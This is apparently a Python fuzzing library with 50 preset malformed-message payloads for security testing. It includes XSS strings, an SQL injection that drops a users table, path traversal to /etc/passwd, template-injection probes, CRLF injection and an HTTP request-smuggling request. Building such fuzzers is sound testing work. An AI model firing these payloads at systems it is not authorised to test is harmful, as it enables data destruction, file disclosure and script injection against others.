"""Fuzzing Payload 库 - 预设 50 种畸形消息模板 + 动态生成器"""

import json
import os
import struct
import zlib
from typing import Callable, Dict, List


class FuzzPayload:
    __slots__ = ("id", "name", "category", "description",
                 "severity", "generator", "raw_data", "binary")

    def __init__(self, pid: str, name: str, category: str, description: str,
                 severity: str, generator: Callable = None, raw_data: bytes | str = "",
                 binary: bool = False):
        self.id = pid
        self.name = name
        self.category = category
        self.description = description
        self.severity = severity
        self.generator = generator
        self.raw_data = raw_data
        self.binary = binary

    def generate(self) -> bytes | str:
        if self.generator:
            return self.generator()
        return self.raw_data

    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "name": self.name,
            "category": self.category,
            "description": self.description,
            "severity": self.severity,
        }


def _gen_overlong_utf8() -> bytes:
    payload = ""
    for i in range(10):
        payload += chr(0xF0) + chr(0x80) + chr(0x80) + chr(0x80 + i)
    return payload.encode("utf-8", errors="replace")


def _gen_surrogate_pairs() -> str:
    pairs = []
    for i in range(5):
        high = 0xD800 + i
        low = 0xDC00 + i
        pairs.append(chr(high) + chr(low))
    return "".join(pairs)


def _gen_lone_surrogates() -> str:
    return "".join(chr(0xD800 + i) for i in range(10))


def _gen_null_byte_injection() -> str:
    return "A" * 100 + "\x00" + "B" * 100


def _gen_invalid_continuation() -> bytes:
    return b"\x80\x80\x80\x80" * 10


def _gen_overlong_3byte() -> bytes:
    result = b""
    for i in range(20):
        result += b"\xE0\x80\x80"
    return result


def _gen_overlong_4byte() -> bytes:
    return b"\xF0\x80\x80\x80" * 10


def _gen_max_unicode_bom() -> str:
    return "\uFEFF" * 50 + "test"


def _gen_rtl_override() -> str:
    return "正常消息\u202Ehidden\u202D正常消息"


def _gen_zero_width_chars() -> str:
    return "\u200B\u200C\u200D\uFEFF" * 100


def _gen_homoglyph_attack() -> str:
    return "\u0430\u0435\u043E\u0440\u043C\u0430\u043B"


def _gen_truncated_json() -> str:
    return '{"type":"message","content":"' + "A" * 1000


def _gen_json_missing_brace() -> str:
    return '{"type":"message","content":"test"'


def _gen_json_extra_comma() -> str:
    return '{"type":"message",,"content":"test",}'


def _gen_json_invalid_escape() -> str:
    return '{"type":"message","content":"\\x\\uFFFF\\U00110000"}'


def _gen_json_deeply_nested() -> str:
    inner = '{"data":'
    return inner * 500 + '{}' + '}' * 500


def _gen_json_circular_ref_sim() -> str:
    return '{"a":{"a":{"a":{"a":"end"}}'


def _gen_json_number_overflow() -> str:
    return '{"num":' + "9" * 10000


def _gen_json_negative_zero() -> str:
    return '{"num":-0,"content":"test"}'


def _gen_json_very_large_array() -> str:
    return '{"arr":[' + ",".join(["1"] * 10000) + ']}'


def _gen_json_control_chars() -> str:
    return '{"type":"\x00\x01\x02\x03message","content":"test"}'


def _gen_json_duplicate_keys() -> str:
    return '{"type":"a","type":"b","type":"c","content":"test"}'


def _gen_json_unicode_issue() -> str:
    return '{"\\u0000null\u0000null'


def _gen_json_empty_keys() -> str:
    return '{"":""}'


def _gen_unclosed_bracket() -> str:
    return "[" * 1000


def _gen_unclosed_brace() -> str:
    return "{" * 1000


def _gen_unclosed_string() -> str:
    return '"' * 5000


def _gen_mixed_delimiters() -> str:
    return "}{][}{" * 500


def _gen_compression_bomb_deflate() -> bytes:
    data = b"\x00" * 100000
    compressed = zlib.compress(data, 9)
    return compressed


def _gen_compression_bomb_zip() -> bytes:
    data = b"A" * 1000000
    return zlib.compress(data, 9)


def _gen_deeply_nested_xml() -> str:
    return "<a>" * 10000 + "</a>" * 10000


def _gen_ssti_mustache() -> str:
    return "{{7*7}}{{config}}{{7*'7'}}"


def _gen_ssti_jinja2() -> str:
    return "${7*7}{{7*7}}<%= 7*7 %>"


def _gen_ssti_velocity() -> str:
    return "#{7*7}${7*7}"


def _gen_xss_basic() -> str:
    return "<script>alert(1)</script>"


def _gen_xss_event_handler() -> str:
    return '<img src=x onerror=alert(1)>'


def _gen_xss_javascript_uri() -> str:
    return "javascript:alert(1)"


def _gen_xss_svg() -> str:
    return "<svg/onload=alert(1)>"


def _gen_xss_mutation() -> str:
    return "<><!--><img src=x:x onerror=alert(1)></!-->"


def _gen_sql_injection() -> str:
    return "' OR '1'='1'; DROP TABLE users;--"


def _gen_nosql_injection() -> str:
    return '{"$gt": ""}'


def _gen_path_traversal() -> str:
    return "../../../../etc/passwd"


def _gen_path_traversal_encoded() -> str:
    return "..%2F..%2F..%2F..%2Fetc%2Fpasswd"


def _gen_format_string() -> str:
    return "%s%p%n%x" * 100


def _gen_integer_overflow() -> str:
    return str(2**1024)


def _gen_buffer_overflow_pattern() -> str:
    return "A" * 100000


def _gen_header_injection() -> str:
    return "\r\nX-Injected: true\r\n\r\n"


def _gen_crlf_injection() -> str:
    return "normal\r\n\r\nHTTP/1.1 200 OK\r\n"


def _gen_http_request_smuggling() -> bytes:
    return b"GET / HTTP/1.1\r\nHost: evil\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n"


def _gen_slowloris_style() -> str:
    return "A" * 50


def _gen_race_condition_connect() -> str:
    return '{"type":"join","room":"test"}'


def _gen_oversized_message() -> str:
    return "A" * 10485760


def _gen_bidi_override_path() -> str:
    return "‮administrator‮normal"


PRESET_PAYLOADS: List[FuzzPayload] = [
    FuzzPayload("FUZZ-001", "超长UTF-8序列", "utf8",
                "Overlong 4-byte UTF-8 sequences", "high",
                generator=_gen_overlong_utf8, binary=True),
    FuzzPayload("FUZZ-002", "代理对字符", "utf8",
                "Unicode surrogate pairs", "medium",
                generator=_gen_surrogate_pairs),
    FuzzPayload("FUZZ-003", "孤立代理项", "utf8",
                "Lone surrogate characters", "medium",
                generator=_gen_lone_surrogates),
    FuzzPayload("FUZZ-004", "空字节注入", "injection",
                "Null byte injection in message", "high",
                generator=_gen_null_byte_injection),
    FuzzPayload("FUZZ-005", "无效连续字节", "utf8",
                "Invalid UTF-8 continuation bytes", "high",
                generator=_gen_invalid_continuation, binary=True),
    FuzzPayload("FUZZ-006", "3字节超长编码", "utf8",
                "Overlong 3-byte UTF-8", "medium",
                generator=_gen_overlong_3byte, binary=True),
    FuzzPayload("FUZZ-007", "4字节超长编码", "utf8",
                "Overlong 4-byte UTF-8", "medium",
                generator=_gen_overlong_4byte, binary=True),
    FuzzPayload("FUZZ-008", "BOM泛滥", "utf8",
                "Multiple BOM characters", "low",
                generator=_gen_max_unicode_bom),
    FuzzPayload("FUZZ-009", "RTL覆盖攻击", "utf8",
                "RTL override characters", "medium",
                generator=_gen_rtl_override),
    FuzzPayload("FUZZ-010", "零宽字符洪水", "utf8",
                "Zero-width characters flood", "low",
                generator=_gen_zero_width_chars),
    FuzzPayload("FUZZ-011", "同形异义攻击", "utf8",
                "Cyrillic homoglyph attack", "low",
                generator=_gen_homoglyph_attack),
    FuzzPayload("FUZZ-012", "截断JSON", "json",
                "Truncated JSON object", "high",
                generator=_gen_truncated_json),
    FuzzPayload("FUZZ-013", "缺少闭合大括号", "json",
                "JSON missing closing brace", "high",
                generator=_gen_json_missing_brace),
    FuzzPayload("FUZZ-014", "多余逗号", "json",
                "JSON with extra commas", "medium",
                generator=_gen_json_extra_comma),
    FuzzPayload("FUZZ-015", "无效转义序列", "json",
                "JSON invalid escape sequences", "high",
                generator=_gen_json_invalid_escape),
    FuzzPayload("FUZZ-016", "深度嵌套JSON", "json",
                "Deeply nested JSON (500 levels)", "high",
                generator=_gen_json_deeply_nested),
    FuzzPayload("FUZZ-017", "循环引用模拟", "json",
                "Circular reference simulation", "medium",
                generator=_gen_json_circular_ref_sim),
    FuzzPayload("FUZZ-018", "数字溢出", "json",
                "JSON number overflow", "medium",
                generator=_gen_json_number_overflow),
    FuzzPayload("FUZZ-019", "负零值", "json",
                "JSON negative zero", "low",
                generator=_gen_json_negative_zero),
    FuzzPayload("FUZZ-020", "超大数组", "json",
                "JSON with 10000 elements", "medium",
                generator=_gen_json_very_large_array),
    FuzzPayload("FUZZ-021", "控制字符JSON", "json",
                "JSON with control characters", "medium",
                generator=_gen_json_control_chars),
    FuzzPayload("FUZZ-022", "重复键JSON", "json",
                "JSON with duplicate keys", "low",
                generator=_gen_json_duplicate_keys),
    FuzzPayload("FUZZ-023", "Unicode空值注入", "json",
                "JSON null unicode injection", "medium",
                generator=_gen_json_unicode_issue),
    FuzzPayload("FUZZ-024", "空键JSON", "json",
                "JSON with empty keys", "low",
                generator=_gen_json_empty_keys),
    FuzzPayload("FUZZ-025", "未闭合方括号", "syntax",
                "Unclosed brackets", "high",
                generator=_gen_unclosed_bracket),
    FuzzPayload("FUZZ-026", "未闭合大括号", "syntax",
                "Unclosed braces", "high",
                generator=_gen_unclosed_brace),
    FuzzPayload("FUZZ-027", "未闭合字符串", "syntax",
                "Unclosed string quotes", "high",
                generator=_gen_unclosed_string),
    FuzzPayload("FUZZ-028", "混合分隔符", "syntax",
                "Mismatched delimiters", "medium",
                generator=_gen_mixed_delimiters),
    FuzzPayload("FUZZ-029", "压缩炸弹Deflate", "compression",
                "Deflate compression bomb (100KB)", "high",
                generator=_gen_compression_bomb_deflate, binary=True),
    FuzzPayload("FUZZ-030", "压缩炸弹Zlib", "compression",
                "Zlib compression bomb (1MB)", "high",
                generator=_gen_compression_bomb_zip, binary=True),
    FuzzPayload("FUZZ-031", "深度嵌套XML", "xml",
                "Deeply nested XML tags", "medium",
                generator=_gen_deeply_nested_xml),
    FuzzPayload("FUZZ-032", "SSTI-Mustache", "ssti",
                "Server-Side Template Injection", "critical",
                generator=_gen_ssti_mustache),
    FuzzPayload("FUZZ-033", "SSTI-Jinja2", "ssti",
                "Jinja2 template injection", "critical",
                generator=_gen_ssti_jinja2),
    FuzzPayload("FUZZ-034", "SSTI-Velocity", "ssti",
                "Velocity template injection", "critical",
                generator=_gen_ssti_velocity),
    FuzzPayload("FUZZ-035", "XSS-基础脚本", "xss",
                "Basic script tag XSS", "high",
                generator=_gen_xss_basic),
    FuzzPayload("FUZZ-036", "XSS-事件处理器", "xss",
                "Event handler XSS", "high",
                generator=_gen_xss_event_handler),
    FuzzPayload("FUZZ-037", "XSS-JS协议", "xss",
                "JavaScript URI XSS", "high",
                generator=_gen_xss_javascript_uri),
    FuzzPayload("FUZZ-038", "XSS-SVG加载", "xss",
                "SVG onload XSS", "high",
                generator=_gen_xss_svg),
    FuzzPayload("FUZZ-039", "XSS-变异标签", "xss",
                "Mutation XSS payload", "high",
                generator=_gen_xss_mutation),
    FuzzPayload("FUZZ-040", "SQL注入", "sqli",
                "Classic SQL injection", "critical",
                generator=_gen_sql_injection),
    FuzzPayload("FUZZ-041", "NoSQL注入", "sqli",
                "NoSQL injection ($gt operator", "critical",
                generator=_gen_nosql_injection),
    FuzzPayload("FUZZ-042", "路径遍历", "traversal",
                "Path traversal basic", "high",
                generator=_gen_path_traversal),
    FuzzPayload("FUZZ-043", "路径遍历编码", "traversal",
                "URL-encoded path traversal", "high",
                generator=_gen_path_traversal_encoded),
    FuzzPayload("FUZZ-044", "格式字符串", "format",
                "Format string attack", "medium",
                generator=_gen_format_string),
    FuzzPayload("FUZZ-045", "整数溢出", "overflow",
                "Integer overflow (2^1024)", "medium",
                generator=_gen_integer_overflow),
    FuzzPayload("FUZZ-046", "缓冲区溢出模式", "overflow",
                "Buffer overflow pattern (100KB)", "high",
                generator=_gen_buffer_overflow_pattern),
    FuzzPayload("FUZZ-047", "HTTP头注入", "header",
                "HTTP header injection CRLF", "high",
                generator=_gen_header_injection),
    FuzzPayload("FUZZ-048", "CRLF注入", "header",
                "CRLF injection response splitting", "high",
                generator=_gen_crlf_injection),
    FuzzPayload("FUZZ-049", "请求走私", "header",
                "HTTP request smuggling", "high",
                generator=_gen_http_request_smuggling, binary=True),
    FuzzPayload("FUZZ-050", "超大消息体", "overflow",
                "Oversized message (10MB)", "high",
                generator=_gen_oversized_message),
]


def get_payload_by_id(pid: str) -> FuzzPayload | None:
    for p in PRESET_PAYLOADS:
        if p.id == pid:
            return p
    return None


def get_payloads_by_category(category: str) -> List[FuzzPayload]:
    return [p for p in PRESET_PAYLOADS if p.category == category]


def get_all_payloads() -> List[FuzzPayload]:
    return PRESET_PAYLOADS


def get_categories() -> List[str]:
    return sorted({p.category for p in PRESET_PAYLOADS})


def get_severity_counts() -> Dict[str, int]:
    counts: Dict[str, int] = {}
    for p in PRESET_PAYLOADS:
        counts[p.severity] = counts.get(p.severity, 0) + 1
    return counts


def load_custom_payloads(filepath: str) -> List[FuzzPayload]:
    payloads: List[FuzzPayload] = []
    if not os.path.exists(filepath):
        return payloads
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            data = json.load(f)
        for item in data:
            if isinstance(item, dict):
                pid = item.get("id", f"CUSTOM-{len(payloads)+1}")
                name = item.get("name", "Custom Payload")
                category = item.get("category", "custom")
                description = item.get("description", "")
                severity = item.get("severity", "medium")
                raw = item.get("data", "")
                binary = item.get("binary", False)
                payloads.append(FuzzPayload(
                    pid=pid, name=name, category=category,
                    description=description, severity=severity,
                    raw_data=raw, binary=binary,
                ))
    except Exception:
        pass
    return payloads


def export_payload_template() -> dict:
    return {
        "name": "My Custom Payload",
        "category": "custom",
        "description": "Description of the payload",
        "severity": "high",
        "data": "raw payload content here",
        "binary": False,
    }


def print_payloads_table() -> str:
    lines = []
    for p in PRESET_PAYLOADS:
        lines.append(
            f"  {p.id:10s} | {p.category:12s} | {p.severity:8s} | {p.name}"
        )
    return "\n".join(lines)
